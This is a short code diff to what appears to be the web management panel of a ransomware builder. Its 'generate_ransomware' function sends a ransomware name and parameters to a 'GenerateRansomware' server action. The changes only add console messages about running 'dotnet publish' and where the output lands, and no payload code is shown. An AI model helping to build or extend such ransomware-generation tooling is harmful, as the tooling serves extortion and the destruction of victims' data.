@@ -288,10 +288,11 @@
                 generate_ransomware: function () {
                     this.loading_conf = true;
                     this.button_display = true;
-
+                    this.console_output = [];
                     this.console_view("Process started");
-                    
                     this.console_view("Rewriting parameters in code");
+                    setTimeout(() => { this.console_view("running dotnet publish....") }, 3000);
+
 
                     var parameters = {
                         name: this.ransomware_name,
@@ -305,6 +306,7 @@
                     this.get_request('@Url.Action("GenerateRansomware", "Management")', parameters).then(response => {
                         if (response.data.success !== false) {
                             this.show_success_notification(response.data.message);
+                            this.console_view("location > /bin/Release/netcoreapp3.1/win10-x64/publish");    
                             this.loading_conf = false;
                             this.button_display = false;
 
